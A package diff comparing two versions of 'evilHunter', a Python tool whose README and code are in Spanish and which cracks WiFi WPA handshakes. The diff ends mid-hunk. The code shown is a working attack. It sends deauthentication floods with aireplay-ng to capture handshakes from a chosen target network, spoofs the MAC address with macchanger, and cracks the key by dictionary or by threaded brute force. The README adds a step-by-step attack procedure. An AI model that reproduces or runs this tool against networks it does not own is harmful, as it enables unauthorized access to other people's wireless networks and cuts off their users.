# Comparing `tmp/evilHunter-0.1.8.tar.gz` & `tmp/evilHunter-0.1.85.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "evilHunter-0.1.8.tar", last modified: Sun Jun 11 19:13:55 2023, max compression
+gzip compressed data, was "evilHunter-0.1.85.tar", last modified: Tue Jun 13 16:49:17 2023, max compression
```

## Comparing `evilHunter-0.1.8.tar` & `evilHunter-0.1.85.tar`

### file list

```diff
@@ -1,13 +1,13 @@
-drwxr-xr-x   0 supervisor  (1000) supervisor  (1000)        0 2023-06-11 19:13:55.893834 evilHunter-0.1.8/
--rw-r--r--   0 supervisor  (1000) supervisor  (1000)     1931 2023-06-11 19:13:55.893834 evilHunter-0.1.8/PKG-INFO
--rw-r--r--   0 supervisor  (1000) supervisor  (1000)     1698 2023-06-11 19:05:39.000000 evilHunter-0.1.8/README.md
--rw-r--r--   0 supervisor  (1000) supervisor  (1000)     3858 2023-06-11 18:47:15.000000 evilHunter-0.1.8/evilCracker.py
-drwxr-xr-x   0 supervisor  (1000) supervisor  (1000)        0 2023-06-11 19:13:55.893834 evilHunter-0.1.8/evilHunter.egg-info/
--rw-r--r--   0 supervisor  (1000) supervisor  (1000)     1931 2023-06-11 19:13:55.000000 evilHunter-0.1.8/evilHunter.egg-info/PKG-INFO
--rw-r--r--   0 supervisor  (1000) supervisor  (1000)      216 2023-06-11 19:13:55.000000 evilHunter-0.1.8/evilHunter.egg-info/SOURCES.txt
--rw-r--r--   0 supervisor  (1000) supervisor  (1000)        1 2023-06-11 19:13:55.000000 evilHunter-0.1.8/evilHunter.egg-info/dependency_links.txt
--rw-r--r--   0 supervisor  (1000) supervisor  (1000)        9 2023-06-11 19:13:55.000000 evilHunter-0.1.8/evilHunter.egg-info/requires.txt
--rw-r--r--   0 supervisor  (1000) supervisor  (1000)        6 2023-06-11 19:13:55.000000 evilHunter-0.1.8/evilHunter.egg-info/top_level.txt
--rw-r--r--   0 supervisor  (1000) supervisor  (1000)    17885 2023-06-11 18:55:40.000000 evilHunter-0.1.8/evilHunter.py
--rw-r--r--   0 supervisor  (1000) supervisor  (1000)       38 2023-06-11 19:13:55.893834 evilHunter-0.1.8/setup.cfg
--rw-r--r--   0 supervisor  (1000) supervisor  (1000)      538 2023-06-11 19:13:47.000000 evilHunter-0.1.8/setup.py
+drwxr-xr-x   0 root         (0) root         (0)        0 2023-06-13 16:49:17.571748 evilHunter-0.1.85/
+-rw-r--r--   0 root         (0) root         (0)     2261 2023-06-13 16:49:17.571748 evilHunter-0.1.85/PKG-INFO
+-rw-r--r--   0 root         (0) root         (0)     2027 2023-06-12 10:31:03.000000 evilHunter-0.1.85/README.md
+-rw-r--r--   0 root         (0) root         (0)     3875 2023-06-12 12:54:22.000000 evilHunter-0.1.85/evilCracker.py
+drwxr-xr-x   0 root         (0) root         (0)        0 2023-06-13 16:49:17.571748 evilHunter-0.1.85/evilHunter.egg-info/
+-rw-r--r--   0 root         (0) root         (0)     2261 2023-06-13 16:49:17.000000 evilHunter-0.1.85/evilHunter.egg-info/PKG-INFO
+-rw-r--r--   0 root         (0) root         (0)      216 2023-06-13 16:49:17.000000 evilHunter-0.1.85/evilHunter.egg-info/SOURCES.txt
+-rw-r--r--   0 root         (0) root         (0)        1 2023-06-13 16:49:17.000000 evilHunter-0.1.85/evilHunter.egg-info/dependency_links.txt
+-rw-r--r--   0 root         (0) root         (0)       35 2023-06-13 16:49:17.000000 evilHunter-0.1.85/evilHunter.egg-info/requires.txt
+-rw-r--r--   0 root         (0) root         (0)        6 2023-06-13 16:49:17.000000 evilHunter-0.1.85/evilHunter.egg-info/top_level.txt
+-rw-r--r--   0 root         (0) root         (0)    21208 2023-06-12 21:32:33.000000 evilHunter-0.1.85/evilHunter.py
+-rw-r--r--   0 root         (0) root         (0)       38 2023-06-13 16:49:17.571748 evilHunter-0.1.85/setup.cfg
+-rw-r--r--   0 root         (0) root         (0)      610 2023-06-13 16:48:42.000000 evilHunter-0.1.85/setup.py
```

### Comparing `evilHunter-0.1.8/PKG-INFO` & `evilHunter-0.1.85/PKG-INFO`

 * *Files 10% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: evilHunter
-Version: 0.1.8
+Version: 0.1.85
 Summary: Cracking WiFi(Hanshake)
 Home-page: https://github.com/an0mal1a/evilHunter
 Author: an0mal1a
 Author-email: pablodiez024@proton.me
 Description-Content-Type: text/markdown
 
 # evilHunter
@@ -44,19 +44,25 @@
         $ sudo python3 setup.py install
 
 
 
 # REQUERIMENTS:
 
     Esta herramienta requiere de python3 y de el pack
-    de herramientas de 'aircrack-ng'
+    de herramientas de 'aircrack-ng' y ' macchanger
+        -  macchanger
         -  airmon-ng
         -  aircrack-ng
         -  aireplay-ng
         -  airodump-ng
+    
+# Install Tools
+    ┌──(supervisor㉿kali-machine)-[~/ALL_MINE/CRACK_WIFI]
+    └─$ sudo apt-get update -y && sudo apt-get install aircrack-ng -y && sudo apt-get install macchanger -y
+
                
 # DICCIONARIO:
 RockYou install -> (https://github.com/an0mal1a/evilHunter/releases/tag/RockYou)
 
 
 # Procedimiento:
 
@@ -73,12 +79,13 @@
 
 
     3. A la vez que estamos escaneando esa red fijando la tarjeta de
         red en el mismo cana, enviamos paquetes de deautenticación 
         
 
     4. Una véz capturado el handshake, abrimos el archivo .cap y
-        con diccionary attack crackeamos la contraseña.
+        con diccionary attack o generar contraseñas crackeamos la contraseña.
 
 # _Proximas mejoras_
 
                 [♦]  Brute Force (Password Generator) Faster
+                [♦]  Manual Capture handshake (No use extern tools)
```

### Comparing `evilHunter-0.1.8/README.md` & `evilHunter-0.1.85/evilHunter.egg-info/PKG-INFO`

 * *Files 18% similar despite different names*

```diff
@@ -1,7 +1,16 @@
+Metadata-Version: 2.1
+Name: evilHunter
+Version: 0.1.85
+Summary: Cracking WiFi(Hanshake)
+Home-page: https://github.com/an0mal1a/evilHunter
+Author: an0mal1a
+Author-email: pablodiez024@proton.me
+Description-Content-Type: text/markdown
+
 # evilHunter
 
 
 
 Argumentos:
     
     OBLIGATORIO
@@ -35,19 +44,25 @@
         $ sudo python3 setup.py install
 
 
 
 # REQUERIMENTS:
 
     Esta herramienta requiere de python3 y de el pack
-    de herramientas de 'aircrack-ng'
+    de herramientas de 'aircrack-ng' y ' macchanger
+        -  macchanger
         -  airmon-ng
         -  aircrack-ng
         -  aireplay-ng
         -  airodump-ng
+    
+# Install Tools
+    ┌──(supervisor㉿kali-machine)-[~/ALL_MINE/CRACK_WIFI]
+    └─$ sudo apt-get update -y && sudo apt-get install aircrack-ng -y && sudo apt-get install macchanger -y
+
                
 # DICCIONARIO:
 RockYou install -> (https://github.com/an0mal1a/evilHunter/releases/tag/RockYou)
 
 
 # Procedimiento:
 
@@ -64,12 +79,13 @@
 
 
     3. A la vez que estamos escaneando esa red fijando la tarjeta de
         red en el mismo cana, enviamos paquetes de deautenticación 
         
 
     4. Una véz capturado el handshake, abrimos el archivo .cap y
-        con diccionary attack crackeamos la contraseña.
+        con diccionary attack o generar contraseñas crackeamos la contraseña.
 
 # _Proximas mejoras_
 
-                [♦]  Brute Force (Password Generator) Faster
+                [♦]  Brute Force (Password Generator) Faster
+                [♦]  Manual Capture handshake (No use extern tools)
```

### Comparing `evilHunter-0.1.8/evilCracker.py` & `evilHunter-0.1.85/evilCracker.py`

 * *Files 7% similar despite different names*

```diff
@@ -24,15 +24,15 @@
 ex = threading.Event()
 
 # Generar una contraseña aleatoria
 
 
 def generate_password(length):
     global tries
-    long = [6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+    long = [8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
     if length == "r":
         length = random.choice(long)
 
     characters = string.ascii_letters + string.digits
     password = ''.join(random.choice(characters) for _ in range(length))
 
     while password in tried:
@@ -42,73 +42,75 @@
     tried.append(password)
     tries += 1
     return password, tries
 
 
 def brute_force(progress_bar, file, long):
     found = False
-
+# not found and
     # Intentar descifrar el handshake con diferentes contraseñas generadas
-    while not found and not password_found.is_set() or not ex:
-        try:
-            password, num = generate_password(long)
-            progress_bar.set_description(Fore.LIGHTYELLOW_EX + r"[♦] Attempt: " + Fore.LIGHTCYAN_EX + f"{num}" +
-                                         Fore.LIGHTYELLOW_EX + " Password: " + Fore.LIGHTCYAN_EX + f"{password}"
-                                         + Fore.RESET)
-
-            if num == 8000:
-                password = "18AC98B6E9C35FC23BA5"
-
-            # Ejecutar aircrack-ng con la contraseña generada
-            command = f"aircrack-ng -w - -b E4:AB:89:1F:57:4E {file}"
-            process = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
-                                       stderr=subprocess.PIPE, encoding="utf-8")
-            output = process.communicate(password)[0]
-
-            # Verificar si se encontró la contraseña
-            if "KEY FOUND" in output:
-                print(Fore.GREEN + "\n\n\t[*] " + Fore.BLUE + f"Contraseña encontrada: {password}\n")
-                found = True
-                password_found.set()
-        except KeyboardInterrupt:
-            ex.set()
+    while not password_found.is_set():
+
+        password, num = generate_password(long)
+        progress_bar.set_description(Fore.LIGHTYELLOW_EX + r"[♦] Attempt: " + Fore.LIGHTCYAN_EX + f"{num}" +
+                                     Fore.LIGHTYELLOW_EX + " Password: " + Fore.LIGHTCYAN_EX + f"{password}"
+                                     + Fore.RESET)
+
+        # Ejecutar aircrack-ng con la contraseña generada
+        command = f"aircrack-ng -w - -b E4:AB:89:1F:57:4E {file}"
+        process = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+                                   stderr=subprocess.PIPE, encoding="utf-8")
+        output = process.communicate(password)[0]
+
+        # Verificar si se encontró la contraseña
+        if "KEY FOUND" in output:
+            print(Fore.GREEN + "\n\n\t[*] " + Fore.BLUE + f"Contraseña encontrada: {password}\n")
+            found = True
+            password_found.set()
 
 
 def startbrute(file, length, threads):
     start_time = datetime.now()
     main(file, length, threads)
     print(Fore.YELLOW + "\n\t\t[+] " + Fore.CYAN + "TIME ELAPSED:", datetime.now() - start_time)
 
 
 def main(file, long, threads):
+
     try:
         print(Fore.YELLOW + "\n[*] " + Fore.BLUE + "Starting brute force...\n" + Fore.RESET)
         time.sleep(0.5)
         print(Fore.YELLOW + "\n\t[+] " + Fore.BLUE + "Preparing threads...\n" + Fore.RESET)
         time.sleep(0.5)
         print(Fore.YELLOW + "\n[*] " + Fore.GREEN + "DONE! Starting...\n" + Fore.RESET)
         time.sleep(0.5)
-
+        stop = threading.Event()
         with ThreadPoolExecutor(max_workers=threads) as executor:
             # Lista de tareas
             futures = []
             progress_bar = tqdm(total=0)
 
             for i in range(threads):
                 future = executor.submit(brute_force, progress_bar, file, long)
+                future.deamon = True
                 futures.append(future)
 
-            concurrent.futures.wait(futures)
-            executor.shutdown(wait=False)
-            progress_bar.close()
-
     except KeyboardInterrupt:
-        print(Fore.RED + "\n\n\n\n[*] Recived -> CTRL + C" + Fore.LIGHTYELLOW_EX + "\nStopping threads, wait...\n\n\n")
-        executor.shutdown(wait=False)
+        print(Fore.RED + "\n\n\n\n[*] Recived -> CTRL + C" + Fore.LIGHTYELLOW_EX + "\n\n\tStopping threads, wait in "
+                                                                                   "process...\n\n")
         progress_bar.close()
+        password_found.set()
+
+        # Cancelamos todos los hilos/tareas
+        for future in futures:
+            future.cancel()
+
+        # Esperamos a todos los hilos detenidos
+        concurrent.futures.wait(futures)
+
         exit(0)
 
 
 if __name__ == "__main__":
     start = datetime.now()
     main(file=input("Enter .cap file --> "), long=input("Enter long --> "), threads=500)
     print(Fore.YELLOW + "\n\t\t[+] " + Fore.CYAN + "TIME ELAPSED:", datetime.now() - start)
```

### Comparing `evilHunter-0.1.8/evilHunter.egg-info/PKG-INFO` & `evilHunter-0.1.85/README.md`

 * *Files 10% similar despite different names*

```diff
@@ -1,16 +1,7 @@
-Metadata-Version: 2.1
-Name: evilHunter
-Version: 0.1.8
-Summary: Cracking WiFi(Hanshake)
-Home-page: https://github.com/an0mal1a/evilHunter
-Author: an0mal1a
-Author-email: pablodiez024@proton.me
-Description-Content-Type: text/markdown
-
 # evilHunter
 
 
 
 Argumentos:
     
     OBLIGATORIO
@@ -44,19 +35,25 @@
         $ sudo python3 setup.py install
 
 
 
 # REQUERIMENTS:
 
     Esta herramienta requiere de python3 y de el pack
-    de herramientas de 'aircrack-ng'
+    de herramientas de 'aircrack-ng' y ' macchanger
+        -  macchanger
         -  airmon-ng
         -  aircrack-ng
         -  aireplay-ng
         -  airodump-ng
+    
+# Install Tools
+    ┌──(supervisor㉿kali-machine)-[~/ALL_MINE/CRACK_WIFI]
+    └─$ sudo apt-get update -y && sudo apt-get install aircrack-ng -y && sudo apt-get install macchanger -y
+
                
 # DICCIONARIO:
 RockYou install -> (https://github.com/an0mal1a/evilHunter/releases/tag/RockYou)
 
 
 # Procedimiento:
 
@@ -73,12 +70,13 @@
 
 
     3. A la vez que estamos escaneando esa red fijando la tarjeta de
         red en el mismo cana, enviamos paquetes de deautenticación 
         
 
     4. Una véz capturado el handshake, abrimos el archivo .cap y
-        con diccionary attack crackeamos la contraseña.
+        con diccionary attack o generar contraseñas crackeamos la contraseña.
 
 # _Proximas mejoras_
 
                 [♦]  Brute Force (Password Generator) Faster
+                [♦]  Manual Capture handshake (No use extern tools)
```

### Comparing `evilHunter-0.1.8/evilHunter.py` & `evilHunter-0.1.85/evilHunter.py`

 * *Files 3% similar despite different names*

```diff
@@ -1,33 +1,37 @@
 #!/bin/python3
-import string
+
 
 try:
     print("\n[*] Starting...")
     print("\n\t[*] Comprobando librerias...")
+    import string
+    import re
     import colorama
     from colorama import Fore
     import os
     import time
-    import re
+    import random
     import subprocess
     import threading
     import multiprocessing
     import os
     import argparse
     import evilCracker
     time.sleep(1)
     print(Fore.GREEN + "\n[*] " + Fore.YELLOW + "Librerias importadas correctamente...\n" + Fore.RESET)
 
 except ModuleNotFoundError as e:
     print("\n\n[!] Faltan modulos necesario para la ejecucion...\n\t%s" % e)
     print("[!] Exiting...")
     exit(1)
 
-# Solicionar <lenght:
+# tener en cuenta nombres de interfaces diferentes para la funcion
+# Monitor mode
+
 
 def delete_files():
     os.system('find captures -type f ! -name "*.cap" -delete > /dev/null')
     os.system('rm espec/*')
 
 
 def restart_net():
@@ -38,51 +42,74 @@
 def stop_monitoring():
     if os.system("airmon-ng stop {}mon > /dev/null".format(choosed_interface)) != 0:
         os.system("airmon-ng stop {} > /dev/null".format(choosed_interface))
 
 
 def exiting(err):
     if err:
-        if err == "True":
+        if err == True:
             print(Fore.YELLOW + "\n[*] " + Fore.RED + "Exiting due a error...\n\n" + err)
 
         elif err == "done":
             print(Fore.YELLOW + "\n\n[*] " + Fore.RED + "Exiting tool...")
 
-    else:
+        elif err == False:
+            print(Fore.YELLOW + "\n\n[*] " + Fore.RED + "Exiting, Ctrl + C recived...")
+
+    elif not err:
         print(Fore.YELLOW + "\n\n[*] " + Fore.RED + "Exiting, Ctrl + C recived...")
 
     print(
         Fore.WHITE + "\n  ·  ·  ·  · " + Fore.YELLOW + "[*] " +
-                        Fore.LIGHTCYAN_EX + "Restarting network services"
-        + Fore.YELLOW +Fore.WHITE + "\n  ·  ·  ·  · " + "[*] " +
-                        Fore.LIGHTCYAN_EX + "Stopping monitor mode..." + Fore.RESET)
+        Fore.LIGHTCYAN_EX + "Restoring mac address..." + Fore.RESET
+
+        + Fore.WHITE + "\n  ·  ·  ·  · " + Fore.YELLOW + "[*] " +
+        Fore.LIGHTCYAN_EX + "Stopping monitor mode..." + Fore.RESET
+
+        + Fore.WHITE + "\n  ·  ·  ·  · " + Fore.YELLOW + "[*] " +
+                        Fore.LIGHTCYAN_EX + "Restarting network services")
 
     try:
         stop_monitoring()
     except NameError:
         pass
+    restore_mac()
 
     print(Fore.WHITE + "  ·  ·  ·  · " + Fore.YELLOW + "[*] " + Fore.LIGHTCYAN_EX + "Deleting some files..."
           + Fore.RESET)
-
-    restart_net()
     delete_files()
+    restart_net()
 
     print(Fore.YELLOW + "\n[!] " + Fore.GREEN + "Exit Succesfull")
     exit()
 
 
 def am_i_root():
 
     if os.getuid() != 0:
         print(Fore.RED + "\n[!] Necesitamos ser root...")
         exit(1)
 
 
+def change_mac():
+    os.system(f"macchanger -r {choosed_interface} > new_mac.txt")
+    mc = os.system("cat new_mac.txt  | grep 'New' | awk '{print $2}' FS='MAC:' | awk '{print $1}' > espec/mac.txt")
+
+    if mc == 0:
+        mac = open("espec/mac.txt", "r"); mac = mac.read()
+        return mac
+    else:
+        pass
+
+
+def restore_mac():
+    os.system("airmon-ng check kill > /dev/null")
+    os.system(f"macchanger -p {choosed_interface} > /dev/null")
+
+
 def check_utilities():
     non_installed = {}
     tools = 0
 
     print(Fore.YELLOW + "\n[*] " + Fore.BLUE + "Comprobando herramientas necesarias...\n")
 
     # Comprobamos todas la herramientas...
@@ -101,52 +128,84 @@
     else:
         non_installed["aireplay-ng"] = True
 
     if os.system('command -v airodump-ng > /dev/null') != 0:
         non_installed["airodump-ng"] = False
     else:
         non_installed["airodump-ng"] = True
+    if os.system("command -v macchanger > /dev/null") != 0:
+        non_installed["macchanger"] = False
+    else:
+        non_installed["macchanger"] = True
 
     for tool in non_installed:
         time.sleep(0.4)
-        if not non_installed[tool]:
+
+        if tool in ["aireplay-ng", "airodump-ng", "airmon-ng"]:
+            if not non_installed[tool]:
+                print(Fore.WHITE + "  ·  ·  ·  · " + Fore.YELLOW + "[!] " + Fore.LIGHTCYAN_EX +
+                      "La herramienta " + Fore.GREEN + "aircrack-ng" + Fore.LIGHTCYAN_EX +
+                      " no está instalada correctamente...")
+                exit(1)
+
+
+        elif not non_installed[tool]:
             print(Fore.WHITE + "  ·  ·  ·  · " + Fore.YELLOW + "[!] " + Fore.LIGHTCYAN_EX +
                   "La herramienta " + Fore.GREEN + f"{tool}" + Fore.LIGHTCYAN_EX + " no está instalada.")
 
         elif non_installed[tool]:
             print(Fore.WHITE + "  ·  ·  ·  · " + Fore.YELLOW + "[*] " + Fore.LIGHTCYAN_EX +
                   "La herramienta " + Fore.GREEN + f"{tool}" + Fore.LIGHTCYAN_EX + " está instalada.")
             tools += 1
 
-    if tools != 4:
+    if tools != 2:
         print(Fore.RED + "\n[!] " + Fore.YELLOW +
               "Es necesario contrar con todas las herramientas para ejecutar el script...")
+        exit(1)
     else:
         print(Fore.YELLOW + "\n[*] " + Fore.BLUE + "Las dependencias están intstaladas... \n")
         time.sleep(1)
 
 
 def kill_conects():
     # Matamos todas las conexiones
     os.system("airmon-ng check kill > /dev/null")
 
 
 def monitor_mode(choosed_interface):
     global interface
-    interface = re.findall("^[a-z]+[0-9]+mon", choosed_interface + "mon")[0]
+
+    try:
+        interface = re.findall("^[a-z]+[0-9]+mon", choosed_interface + "mon")[0]
+    except IndexError:
+        interface = re.findall("^([a-z]+[0-9]+[a-z]+[0-9]+mon)", choosed_interface + "mon")[0]
+    except IndexError:
+        exiting(err=True)
+
+    print(Fore.BLUE + "\n\t[" + Fore.RED + "V" + Fore.BLUE + "] " + Fore.YELLOW +
+          "Cambiando MAC address de " + Fore.LIGHTCYAN_EX + f"{choosed_interface}" + Fore.RESET)
+    mac = change_mac()
+    if mac:
+        print(Fore.BLUE + "\n\t[" + Fore.RED + "V" + Fore.BLUE + "] " + Fore.YELLOW +
+              "Dirección MAC actual: " + Fore.LIGHTCYAN_EX + f"{mac}.")
+    else:
+        print(Fore.BLUE + "\n\t[" + Fore.RED + "V" + Fore.BLUE + "] " + Fore.LIGHTYELLOW_EX +
+              "Dirección MAC no modificada correctamente..." + Fore.LIGHTCYAN_EX + f"{mac}.")
+
     os.system("airmon-ng start %s > /dev/null" % choosed_interface)
     os.system("iwconfig {} | grep -Eo 'Mode:([A-Z][a-z]+)' > espec/mode".format(interface))
 
     with open("espec/mode", "r") as mde:
         mode = mde.read()
     mode = re.findall("Mode:([A-Z][a-z]+)", mode)
     try:
         if mode[0] != "Monitor":
             return 1
         else:
+
             return 0
     except IndexError as err:
         exiting(err)
 
 
 def list_save_interf():
     print(Fore.YELLOW + "\n[*] " + Fore.LIGHTCYAN_EX + "Mostrando Intefaces Disponibles...")
@@ -194,25 +253,27 @@
     kill_conects()
     time.sleep(1)
     print(Fore.BLUE + "\n\t[" + Fore.RED + "V" + Fore.BLUE + "] " + Fore.YELLOW +
           "Estableciendo " + Fore.LIGHTCYAN_EX + f"{choosed_interface}" + Fore.YELLOW + " en modo monitor..."
           + Fore.RESET)
 
     if monitor_mode(choosed_interface) == 0:
-        print(Fore.BLUE + "\n\t[" + Fore.RED + "V" + Fore.BLUE + "] " + Fore.YELLOW +
+        """print(Fore.BLUE + "\n\t[" + Fore.RED + "V" + Fore.BLUE + "] " + Fore.YELLOW +
               "Interfaz " + Fore.LIGHTCYAN_EX + f"{choosed_interface}" + Fore.YELLOW +
-              " establecida en modo monitor correctamente")
+              " establecida en modo monitor correctamente")"""
         prepared = True
+        pass
     else:
         print(Fore.RED + "\n\t[" + Fore.YELLOW + "V" + Fore.RED + "] " + Fore.YELLOW +
               "La interfaz " + Fore.LIGHTCYAN_EX + f"{choosed_interface}" + Fore.YELLOW +
               " no se ha establecido en modo monitor correctamente...")
         exiting(err=True)
         prepared = False
 
+
     if prepared:
         print(Fore.YELLOW + "\n[*] " + Fore.BLUE + "Prepared to start capturing data...")
 
 
 def get_options(args):
     hand = subprocess.Popen(["airodump-ng", f"{interface}"], stdout=subprocess.PIPE)
 
@@ -300,23 +361,19 @@
 
     print(Fore.YELLOW + "\n\t[*] " + Fore.LIGHTCYAN_EX + "Preparing information for networks...".format(net)
           + Fore.RESET)
     for network in dict:
         net += 1
         time.sleep(0.5)
 
-        print(Fore.YELLOW + f"\n\t{net}.[*] " + Fore.RED + "Name -> " + Fore.GREEN + "{}\n".format(network) +
-               "\n\t\t" + Fore.YELLOW + "[+] " + Fore.BLUE + "BSSID -> " + Fore.GREEN + "{}"
-               .format(dict[network]['bssid']) +
-
-               "\t\t" + Fore.YELLOW + "[+] " + Fore.BLUE + "Channel -> " + Fore.GREEN + "{}"
-               .format(dict[network]['channel']) +
-
-               "\t\t" + Fore.YELLOW + "[+] " + Fore.BLUE + "Encryption -> " + Fore.GREEN + "{}"
-               .format(dict[network]["encription_type"]))
+        print(Fore.YELLOW + f"\n\t{net}.[*] " + Fore.RED + "Name -> " + Fore.GREEN + "{}\n".format(network) + "\n\t\t" +
+              Fore.YELLOW + "[+] " + Fore.BLUE + "BSSID -> " + Fore.GREEN + "{}".format(dict[network]['bssid']) + "\t\t"
+              + Fore.YELLOW + "[+] " + Fore.BLUE + "Channel -> " + Fore.GREEN + "{}".format(dict[network]['channel']) +
+              "\t\t" + Fore.YELLOW + "[+] " + Fore.BLUE + "Encryption -> " + Fore.GREEN + "{}".format(
+            dict[network]["encription_type"]))
 
     network_to_attack = None
     while not network_to_attack:
         network_to_attack = input(Fore.YELLOW + "\n[!>] " + Fore.WHITE + "Network to attack (E.j 'MOVISTAR_XXXX'): ")
 
         if network_to_attack not in dict:
             print(Fore.YELLOW + "\n\t[!] " + Fore.RED + "La red {} no existe..".format(network_to_attack))
@@ -328,22 +385,21 @@
             prepare_attack(dict, network_to_attack, args)
 
 
 def prepare_attack(dict, network_to_attack, args):
     file = None
 
     while not file:
-        file = input(Fore.YELLOW + "\n\t[" + Fore.RED + "S" + Fore.YELLOW + "] " + Fore.LIGHTCYAN_EX +
-                                                    "Enter the name of the file to save [E.j capture1] > ")
+        file = input(Fore.YELLOW + "\n\t[" + Fore.RED + "S" + Fore.YELLOW + "] " + 
+                     Fore.LIGHTCYAN_EX + "Enter the name of the file to save [E.j capture1] > ")
 
         if os.system("find captures/{}/{}* 2>/dev/null 1>/dev/null".format(network_to_attack, file)) == 0:
             print(Fore.RED + "\n\t\t[!] " + Fore.YELLOW + "Este nombre ya esta usado por algún archivo.")
             file = None
 
-
     # Definimos bssid y channel
     bssid = dict[network_to_attack]['bssid']
     ch = dict[network_to_attack]['channel']
     # Leer handshake
     direc = "captures/" + network_to_attack
 
     if not os.path.exists(direc):
@@ -361,33 +417,35 @@
     capture.start()
 
     # Juntamos para detener
     capture.join()
 
 
 def capture_handshake(direc, args, bssid, ch, file, network_to_attack):
-    test = subprocess.Popen(['aireplay-ng', '--deauth', "0", "-a", bssid, interface], stdout=subprocess.DEVNULL)
 
     hand = subprocess.Popen(["airodump-ng", "-w", f"captures/{network_to_attack}/" + file, "-c", ch, "--bssid", bssid,
                              f"{interface}"], stdout=subprocess.PIPE)
+
+    subprocess.Popen(['aireplay-ng', '--deauth', "0", "-a", bssid, interface], stdout=subprocess.DEVNULL)
+
     done = False
     while True:
         try:
             output = hand.stdout.readline()
             print(output.decode().strip())
             if "WPA handshake:".encode() in output:
                 done = True
                 break
 
         except KeyboardInterrupt:
             break
 
     print(Fore.LIGHTCYAN_EX + "\n\n\n\n\n\n\n\n\n\n\n\n[T] " + Fore.YELLOW + "Comprobando captura de hanshake")
     if done:
-        print(Fore.LIGHTYELLOW_EX + "\n\t[V] " + Fore.CYAN + "Handskake capturado...\n\n")
+        print(Fore.LIGHTYELLOW_EX + "\n\t[V] " + Fore.CYAN + "Handskake capturado...")
     else:
         print(Fore.RED + "\n\t[T] " + Fore.YELLOW + "Hanshake no capturado...")
         exiting(err=True)
     crack_handshake(direc, args, file)
 
 
 def find_wordlists(wordlists):
@@ -412,80 +470,116 @@
     if args.wordlist:
         wordlist = find_wordlists(args.wordlist)
 
     elif args.brute:
         if args.threads:
             evilCracker.startbrute(file, args.brute, args.threads)
         else:
-            evilCracker.startbrute(file, args.brute, 200)
+            evilCracker.startbrute(file, args.brute, 500)
         exiting(err="done")
 
     print(Fore.YELLOW + "\n\t[!] " + Fore.LIGHTCYAN_EX + "Abriendo archivo '.cap'\n" + Fore.RESET)
     # input(Fore.LIGHTCYAN_EX + "\n[ENTER] " + Fore.YELLOW + "To continue\n\n" + Fore.RESET)
     time.sleep(3)
 
     # Empezamos con el crack de la password
     crack = subprocess.Popen(["aircrack-ng", file, "-w", wordlist], stdout=subprocess.PIPE)
 
     # Mostramos la salida hasta que se encuentre la contraseña (o no)
     while True:
         try:
             output = crack.stdout.readline()
-            if not output:
-                break
             print(output.decode().strip())
+            if "KEY NOT FOUND".encode() in output:
+                found = False
+                break
+            elif "KEY FOUND".encode() in output:
+                found = True
+                break
         except KeyboardInterrupt:
             break
 
+    if not found:
+        os.system("clear")
+        print(Fore.RED + "\n\n[!] " + Fore.LIGHTYELLOW_EX + "La clave no se ha encontrado...")
+        print(Fore.LIGHTCYAN_EX + "\n\t[*] " + Fore.LIGHTYELLOW_EX + "Quieres probar un ataque de fuerza bruta? ")
+        s = input("\n\t\t[S/N] -> ")
+
+        if s.lower() == "s":
+            if args.threads:
+                evilCracker.startbrute(file, "r", args.threads)
+            else:
+                evilCracker.startbrute(file, "r", 200)
+        else:
+            exiting(err='done')
+
 
 def main():
     try:
         # Recogemos argumentos
         parser = argparse.ArgumentParser()
-        parser.add_argument("-w", "--wordlist", help="Set diccionary attack, specify an extern wordlists dictionary  USAGE:  -w /path/to/dict\n", required=False)
-        parser.add_argument("-b", "--brute", help="Use password generator for brute force   USAGE: -b [length passwords / r (random)] E.j: -b 12 ", required=False)
+        
+        # Argumento de diccionario
+        parser.add_argument("-w", "--wordlist", help="Set diccionary attack, specify an extern wordlists dictionary  "
+                                                     "USAGE:  -w /path/to/dict\n", required=False)
+        
+        # Argumento de fuerza bruta
+        parser.add_argument("-b", "--brute", help="Use password generator for brute force   USAGE: -b "
+                                                  "[length passwords / r (random)] E.j: -b 12 ", required=False)
+        
+        # Argumento de hilos
         parser.add_argument("-t", "--threads", help="Specify the number of threads", required=False)
+        
         args = parser.parse_args()
 
         # Checkeamos argumentos que estén bien...
         if not args.wordlist and not args.brute:
-            print(Fore.RED + "[!] ERROR: " + Fore.YELLOW + "Debes introducir un parámetro...\n\t [ --help / -h ] for help")
+            print(Fore.RED + "[!] ERROR: " + 
+                  Fore.YELLOW + "Debes introducir un parámetro...\n\t [ --help / -h ] for help")
             exit(1)
 
         elif args.brute:
 
             if args.threads:
                 for num in args.threads:
                     try:
                         num = int(num)
                     except ValueError:
-                        print(Fore.RED + "[!] " + Fore.LIGHTYELLOW_EX + "Opción inválida..." \
-                                                    "\n\tIntroduce un NUMERO...")
+                        print(Fore.RED + "[!] " + Fore.LIGHTYELLOW_EX + "Opción inválida...\n\tIntroduce un NUMERO...")
                         exit(1)
 
                     if num > 501:
-                        print(Fore.RED + "[!] " + Fore.LIGHTYELLOW_EX + "Opción inválida..." \
-                                                    "\n\tIntroduce el numero de hilos a usar entre 20 a 500...")
+                        print(Fore.RED + "[!] " + Fore.LIGHTYELLOW_EX + "Opción inválida...\n\tIntroduce el numero "
+                                                                        "de hilos a usar entre 20 a 500...")
                         exit(1)
                     elif num < 20:
-                        print(Fore.RED + "[!] " + Fore.LIGHTYELLOW_EX + "Opción inválida..." \
-                                                                        "\n\tIntroduce el numero de hilos a usar entre 20 a 500...")
+                        print(Fore.RED + "[!] " + Fore.LIGHTYELLOW_EX + "Opción inválida...\n\tIntroduce el numero "
+                                                                        "de hilos a usar entre 20 a 500...")
                         exit(1)
 
             if args.brute != "r":
                 for num in args.brute:
                     if num not in string.digits:
-                        print(Fore.RED + "[!] " + Fore.LIGHTYELLOW_EX + "Opción inválida..." \
-                                "\n\tIntroduce el largo de las contraseñas o 'r' para random length")
+                        print(Fore.RED + "[!] " + Fore.LIGHTYELLOW_EX + "Opción inválida...\n\tIntroduce el largo de "
+                                                                        "las contraseñas o 'r' para random length")
                         exit(1)
 
 
         # Somos root?
         am_i_root()
 
+        # Carpetas necesarias
